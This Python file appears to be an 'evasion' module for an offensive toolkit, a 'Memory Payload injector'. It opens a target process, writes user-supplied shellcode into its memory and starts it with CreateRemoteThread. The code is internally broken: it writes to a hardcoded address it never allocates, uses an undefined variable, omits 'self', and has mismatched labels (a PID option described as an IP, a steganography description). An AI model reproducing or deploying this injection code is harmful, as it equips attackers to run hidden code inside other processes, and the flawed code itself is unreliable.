MODULE_TYPE = "evasion"
from collections import OrderedDict
import pyfiglet
# Module class definition
class ModuleClass:
    def __init__(self):
        self.info = {
            'Name': 'Memory Payload injector',
            'Rank':'Good',
            'Platform':'Windows/Linux/Macos',
            'architectures':'x86/64 bit processors',
            'Description': 'Steganography  Hiding payloada.',
            'Author': 'pyLord@cyb3rH4ck3r',
            'Date Release': 'Tue/4/March/2025',
            'Options': OrderedDict([
            ('PID', ('Enter target IP (e.g, 1234 )', True,'')),
            ('DATA', ('Your shell code', True, ''))
               
                ])
                }
    def logo(self):
    	title = 'Memory injector'
    	if pyfiglet:
    	       ascii_text = pyfiglet.figlet_format(title, font="standard")
    	       print(f"\033[91m{ascii_text}\033[0m")
    	else:
            print(title)
    def help(self):
    	print("Usage: set PID <Process ID> set DATA <shell_code> ,then run")
   
    import ctypes
    
    def memory_injection(pid, shellcode):
       process_handle = ctypes.windll.kernel32.OpenProcess(0x1F0FFF, False, pid)
       ctypes.windll.kernel32.WriteProcessMemory(process_handle, 0x7C900000, shellcode, len(shellcode), 0)
       ctypes.windll.kernel32.CreateRemoteThread(process_handle, None, 0, 0x7C900000, 0, 0, 0)
    
    
    def execute(self):
        self.logo()
        bytes = self.info['Options']['PID'][0]
        shellcode = self.info['Options']['DATA'][0]
        pid = f'{pid}'
        self.memory_injection(pid, shellcode)
        
        return f"[+] Encoding {pid}  ..."
    